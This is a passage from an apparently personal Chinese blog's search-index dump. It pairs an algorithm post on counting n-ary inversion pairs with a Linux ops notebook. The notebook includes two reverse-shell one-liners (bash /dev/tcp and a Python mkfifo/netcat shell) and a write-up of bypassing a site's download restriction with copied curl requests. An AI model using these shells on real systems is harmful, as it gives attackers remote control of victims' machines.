主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量\n- 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]\n- 首先看看如何求二元逆序对\n   - 从左到右扫描序列，对于序列中位置为`i`的值`x`，flag[x]+=1\n   - 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]\n   - 那么result的数组的和就是逆序对的数量\n   - 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对\n- 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result\\_2数组)，此时设另外的两个数组int flag\\_3[MAX+1], int result_3[n];\n   - 同样扫描序列，对于位置为`i`的数`x`，取出result\\_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag\\_3[x]记录了截止目前，以x结尾的二元组逆序对的数量\n   - 求$\\sum_{j=x+1}^{MAX}flag\\_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中\n   - 到最后，result_3就是结果\n- 更多元组的也如此思路\n- 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对\n- 对于n元逆序对，同理，数组记录了当前已有的数`x`作为`最后一个元素是x的n-1元逆序对`的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与`比他大的数代表的n-1元逆序对`形成了更长的逆序对\n- 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第`i`位的值是`x`）\n\n> 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）\n","content":"<blockquote>\n<p>以下思路都是针对从小到大排序的序列的逆序对</p>\n</blockquote>\n<ul>\n<li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li>\n<li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li>\n<li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li>\n<li>首先看看如何求二元逆序对<ul>\n<li>从左到右扫描序列，对于序列中位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li>\n<li>然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li>\n<li>那么result的数组的和就是逆序对的数量</li>\n<li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li>\n</ul>\n</li>\n<li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul>\n<li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li>\n<li>求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li>\n<li>到最后，result_3就是结果</li>\n</ul>\n</li>\n<li>更多元组的也如此思路</li>\n<li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li>\n<li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li>\n<li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li>\n</ul>\n<blockquote>\n<p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p>\n</blockquote>\n","slug":"n元逆序对数量求解","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"树状数组","slug":"树状数组","permalink":"https://h-zex.github.io/tags/树状数组/"}]},{"title":"My ITOps Note","date":"2018-02-02T06:18:30.000Z","path":"2018/02/02/My-ITOPS-Note/","text":"Reverse Shell 受控机器上执行bash -i /dev/tcp/IP/PORT 0&lt;&amp;1 (最后改为0&gt;&amp;1也ok)，入侵者机器提前打开listen socket，可以实现reverse shell eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)（python代码）也可以 SIGINT的SIG_DEF 默认的handler会输出一个换行。 代码 12345#include &lt;unistd.h&gt;int main()&#123; sleep(10);&#125; 如果不kill -2 a.out则不会输出一个空行，如果kill则会 boot过程 究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector 我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要initrd /boot/initrd.img-4.9.0-deepin13-amd64。（我甚至可以在这条命令前去加载一个ntfs的module）。 既然boot loader 可以加载/boot/目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢 关于initrd The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.Boot-up operation When booting up with initrd, the system boots as follows: The boot loader loads the kernel program and /dev/initrd’s contents into memory. On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory usedby /dev/initrd. The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem. If the indicated normal root filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for theusual boot sequence. If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0. (The file /linuxrc must have exe‐cutable permission. The file /linuxrc can be any valid executable, including a shell script.) If /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted. (If /linuxrc exits with any filesystems mountedon the initial root filesystem, then the behavior of the kernel is UNSPECIFIED. See the NOTES section for the current kernel behavior.) If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd. Otherwise, if the directory /initrd doesnot exist, the device /dev/ram0 is unmounted. (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐ning from /dev/ram0. If directory /initrd does not exist on the normal root filesystem and any processes remain running from /dev/ram0 when/linuxrc exits, the behavior of the kernel is UNSPECIFIED. See the NOTES section for the current kernel behavior.) The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem. tab补全失效 when press tab to 补全, there is bash: 无法为立即文档创建临时文件: 权限不够 this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error 登录用户管理 users或 w查看当前登录的用户 lsof -iTCP netstat -tunp查看当前的网络连接 查看打开的端口 pkill -kill -t pts/1 踢掉pts/1 编辑/etc/hosts.deny ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网) 格式如下（其实不是非常确定以下是有用的） 12sshd:218.65.30.43:denysshd:58.*.*.*:deny 是否没有listen的socket就无法被入侵？wget使用 -r递归下载 -k把下载下来的连接修改为本地地址 -e robots=off不respectrobots.txt 或者是 set the robots variable to ‘off’ in your .wgetrc. --user-agent=&quot;&quot;不添加user-agent头，如果不加上这个，有些网站会返回404 curl的使用 curl可以模拟post/get等行为，但是似乎没法递归下载 axel的使用 -n 100开100个线程 好像还可以调整缓存，从而减少写入磁盘的次数 VirtualBox报错“kernel dirver not installed” 复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装virtualbox-dkms，并运行modprobe vboxdrv 在4.17内核尝试 12345sudo apt updatesudo apt install virtualbox-dkmssudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkmssudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms... 都没有解决问题，更严重的，linux-header-4.17也没有 切换到4.15内核没有解决问题。尝试了以上命令无果 删除4.17内核（直接在/boot/运行rm *4.17* -r）后update-grub。然后重启到4.15.0-23-generic并执行 1234sudo apt updatesudo apt install --fix-missingsudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms sudo modprobe vboxdrv 解决问题 题外话：删除内核时，dpkg --get-selections | grep linux 没有看到4.17相关的 删除内核 sudo apt-get remove linux-headers-4.4.0-22 在/boot/目录下删除相关的东西 chmod chmod -R 666 test(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行） 给文件夹本身加上x——chmod 777 test就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有x标志 内核模块加载 modprobe tcp_bbr加载tcp_bbr模块 比如，echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf即可实现启动自动加载该模块 ufw 如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖 安装centos.md联网 参考资料 修改/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0) 改为 12345DEVICE=eth0HWADDR=&quot;00:22:19:09:4D:3C&quot;NM_CONTROLLED=yesONBOOT=yes # 默认是 no，我们要改成 yesBOOTPROTO=dhcp # 如果不是这个值也要修改 重启network service 方法一：service network restart 方法二：/etc/init.d/network restart vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat 安装图形界面 安装图形界面 yum groupinstall &quot;X Window System&quot; yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts unlink /etc/systemd/system/default.target ln -sf /lib/systemd/system/graphical.target /etc/systemd/system/default.target 使用fstab自动挂载Deepin 以下是/etc/fstab的内容 在Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux正确工作 代码 1234567891011121314151617181920212223# /dev/sda7UUID=1faa19b8-abfb-44db-b186-5a368498d42b / ext4 rw,relatime,data=ordered 0 1# /dev/sda1UUID=CCCB-BF68 /boot/efi vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro 0 2# /dev/sda4UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none swap defaults 0 0# /dev/sda5# UUID=0CADCC32742391F2 /home/hzx/sda5 ntfs defaults 0 1UUID=0CADCC32742391F2 /mnt/data ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2# /dev/sda6# UUID=2A3C344750F6F698 /home/hzx/sda6 ntfs defaults 0 1UUID=2A3C344750F6F698 /mnt/software ntfs defaults 1 2# /dev/sda3# UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /home/hzx/sda3 ext4 defaults 0 1UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /mnt/deepin-sda3 ext4 defaults 1 2 然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把defaults换成nofail还是相反，都没用 后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误 Ubuntu 一切正常 代码 1234567891011121314151617181920212223242526272829# /etc/fstab: static file system information.## Use &apos;blkid&apos; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# / was on /dev/sda8 during installationUUID=3ae3faef-8fe6-42ef-8874-a0417df43831 / ext4 errors=remount-ro 0 1# /boot/efi was on /dev/sda1 during installationUUID=CCCB-BF68 /boot/efi vfat umask=0077 0 1# swap was on /dev/sda4 during installationUUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none swap sw 0 0# /dev/sda5# UUID=0CADCC32742391F2 /home/hzx/sda5 ntfs defaults 0 1UUID=0CADCC32742391F2 /media/hzx/0CADCC32742391F2 ntfs nofail 1 2# /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2# /dev/sda6# UUID=2A3C344750F6F698 /home/hzx/sda6 ntfs defaults 0 1UUID=2A3C344750F6F698 /media/hzx/2A3C344750F6F698 ntfs nofail 1 2# /dev/sda9UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2# /dev/sda3# UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /home/hzx/sda3 ext4 defaults 0 1UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail 1 2 mkfs.vfat了sda2那个efi分区结果deepin启动不了 情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。 放弃，新装一个deepin 15.6，然后就会自动安装引导。 搞定后，进原来那个deepin15.5还是失败，查看journalctl -xb，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。 原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。 后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M 编译内核.md无openssl/bio.h 编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder” “ #include &lt;openssl/bio.h&gt;” &lt;&lt;&gt;&gt; 解决方法: [ubuntu 16.10,64位主机] sudo apt install libssl-dev 记一次尝试下载 不允许下载的sinacloud的pdf 获得页面源代码 在html搜索字符串next从而定位到逻辑代码 然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本 然后去chrome控制台使用以下代码 123456setTimeout(function() &#123; var script = document.createElement('script'); script.type = 'text/javascript'; script.innerHTML = \"console.log(closePay)\"//括号内是要获得的函数名称; document.head.appendChild(script);&#125;, 1000); 然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败 直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片） 查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice 附录12345678910111213//request headhttp://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345GET /swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345 HTTP/1.1Host: sinacloud.netConnection: keep-aliveUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8DNT: 1Accept-Encoding: gzip, deflateAccept-Language: en,zh;q=0.9,zh-CN;q=0.8//从chrome复制的curl命令curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed 查找并删除特定文件.md来源linux命令每日一练linux中find与rm实现查找并删除目录或文件 linux 下用find命令查找文件，rm命令删除文件。 删除指定目录下指定文件find 要查找的目录名 -name .svn |xargs rm -rf 删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r 分析：find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录| xargs rm -r 执行删除指令 删除目录下所有exe文件 find . -name ‘*.exe’ -type f -print -exec rm -rf {} ; (1) “.” 表示从当前目录开始递归查找 (2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件 (3) “ -type f “查找的类型为文件 (4) “-print” 输出查找的文件目录名 (5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号 VPS上部署hexo 参考文章 遇到nginx 403，然后就关闭selinux 1、临时关闭setenforce 0 #设置SELinux 成为permissive模式 setenforce 1 设置SELinux 成为enforcing模式2、修改配置文件需要重启机器： 修改/etc/selinux/config 文件 将SELINUX=enforcing改为SELINUX=disabled 重启机器即可 搭建ss服务器 vps开了进程 本地主机也如此 但是提示[Errno 113] No route to host 实在搞不明白——22端口可以用scp发文件过去vps 所以用py写了个tcpclient、tcpserver，然后一运行也如此提示 所以在vps运行service firewalld stop 其他关闭服务器防火墙的方法都不起作用，不知道问什么 VLC字幕链接 vbox的win7虚拟机无法使用usb 引用自 安装Virtualbox Extension Pack 用户权限添加 添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）sudo groupadd usbfs 将你的linux常用用户添加到vboxusers、usbfs这个两个组中sudo adduser kuein vboxusers sudo adduser kuein usbfs 重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。 Gnome-configure.mdhide title barno-title-bar-extention SSH.md生成秘钥 本地用ssh-keygen生成一个秘钥——可以自定义储存的文件名 把id_rsa.pub传送到vps上，cat id_rsa.pug &gt; ~/.ssh/authorized_keys，注意，这个命令会覆盖原有的authorized_keys内容 本地配置VPS别名 代码 12345678cat &gt;&gt; ~/.ssh/config &lt;&lt;EOFHost VultrVPS User root Hostname 217.163.11.0 PreferredAuthentications publickey IdentityFile ~/.ssh/VultrVPS_rsa Port 22EOF 以上可实现使用秘钥 ，多个VPS可以依次增加配置 Linux安装.md硬盘安装deepin 来源 将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写 12345678menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123; echo &apos;booting...&apos; set isofile=/deepin-15.5-amd64.iso search --file $isofile --set=root loopback loop $isofile linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= -- rootflags=sync initrd (loop)/live/initrd.lz&#125; 刻录U盘安装Fedora或Centos win下使用PowerISO刻录 使用简单的dd命令dd if=xxx of=xxx bs=xx失败 使用Ultraiso失败 U盘grub引导多个linux镜像安装 U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式。文中提供的deepin的那个grub配置无效 使用grub2制作启动U盘，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败 OSC提供的代码make不过12345678910111213source code 9th/final-src-osc9e/ch2 ➜ make make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modulesmake[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils supportmake[3]: *** No rule to make target 'code'. Stop.Makefile:150: recipe for target 'sub-make' failedmake[2]: *** [sub-make] Error 2Makefile:8: recipe for target 'all' failedmake[1]: *** [all] Error 2make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'Makefile:3: recipe for target 'all' failedmake: *** [all] Error 2 解决方法，把source code 9th这个文件名的空格去掉 vim dos unix 如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。 删除文件名以-开头的文件 比如删除-a：rm -- -a 文件的change，modification时间 以下来自于实验：change是修改属性，比如touch -d 1111 filename，modification是修改内容 ctags 注意事项 如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效 watch命令 watch -n 0.1 ./a.o 与watch ./a.o -n 0.1的区别是前者-n 0.1是watch的参数，后者是./a.o的参数 修复light display manger失败 通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败 搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面 就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的） 不知道为什么中途提示proxychain 的配置文件修改了 本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。 后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期 查看glibc版本 ldd --version getconf GNU_LIBC_VERSION shell使用|时的SIGPIPE 比如proc_1 | proc_2，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die 安装nvidia驱动 在nvidia官网下程序 telinit 3关掉X server（或者是systemctl stop lightdm.service） 安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致 12$ cat /proc/versionLinux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018 安装时，如果有驱动占用了gpu，那么会失败，在/etc/modprobe.d/加一个文件（命名为*.conf） 12345678910blacklist nouveaublacklist rivafbblacklist rivatvblacklist nvidiafb# 下面这几条应该可以不用，我不加也成功options nouveau modeset=0 options rivafb modeset=0options rivatv modeset=0options nvidiafb modeset=0 安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况 安装后要运行nvidia-xconfig配置/etc/X11/xorg.conf，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示） 然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist 后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行 Tilix dont inherit the directory The VTE matter this sogouPinyin候选框异常解决方法 其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了~/.config下面的sogou相关配置文件也没用 后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤） cache的详细信息（包括相联度，电压等） sudo dmidecode -t 7 getconf -a | grep CACHE 设置默认浏览器 xdg-settings set default-web-browser chrome.desktop xdg-settings get default-web-browser获取值 关于desktop文件的Exec段中的后缀，doc %i The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.%c The translated name of the application as listed in the appropriate Name key in the desktop entry.%k The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.%f A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.%F A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.%u A single URL. Local files may either be passed as file: URLs or as file path.%U A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path. github账户有设置ssh但是仓库push还是要用户密码的解决方法 这是因为remote add时使用的是https，而不是ssh git remote -v可以看到是https链接 git remote set-url origin git@github.com:USERNAME/REPOSITORY.git改为ssh 参考","raw":"---\ntitle: My ITOps Note\ndate: 2018-2-2 14:18:30\ntags:\n- ITOps\ncategories:\n- 运维\n---\n\n### Reverse Shell\n\n- 受控机器上执行`bash -i /dev/tcp/IP/PORT 0<&1` (最后改为`0>&1`也ok)，入侵者机器提前打开listen socket，可以实现reverse shell\n- `eval(\"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc localhost 8000 > /tmp/f')\")`（python代码）也可以\n\n### SIGINT的SIG_DEF\n\n- 默认的handler会输出一个换行。\n- 代码\n   ```c\n   #include <unistd.h>\n   int main()\n   {\n       sleep(10);\n   }\n   ```\n- 如果不`kill -2 a.out`则不会输出一个空行，如果kill则会\n\n### boot过程\n\n- 究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector\n- 我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要`initrd\t/boot/initrd.img-4.9.0-deepin13-amd64`。（我甚至可以在这条命令前去加载一个ntfs的module）。\n- 既然boot loader 可以加载`/boot/`目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢\n- 关于initrd \n   > The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd's contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device's contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device. \n   > Boot-up operation\n   >    When booting up with initrd, the system boots as follows:\n   >    1. The boot loader loads the kernel program and /dev/initrd's contents into memory.\n   >    2. On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used\n   >       by /dev/initrd.\n   >    3. The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.\n   >    4. If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the\n   >       usual boot sequence.\n   >    5. If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐\n   >       cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)\n   >    6. If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted\n   >       on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)\n   >    7. If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does\n   >       not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐\n   >       ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when\n   >       /linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)\n   >    8. The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.\n\n\n\n### tab补全失效\n\n- when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够\n- this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error\n\n### 登录用户管理\n\n- `users`或 `w`查看当前登录的用户\n\n- `lsof -iTCP` `netstat -tunp`查看当前的网络连接\n\n- 查看打开的端口\n\n- `pkill -kill -t pts/1` 踢掉pts/1\n\n- 编辑`/etc/hosts.deny` ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 